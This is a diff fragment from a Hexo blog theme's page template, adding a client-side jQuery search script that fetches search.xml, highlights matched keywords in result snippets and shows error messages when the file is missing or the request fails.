+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
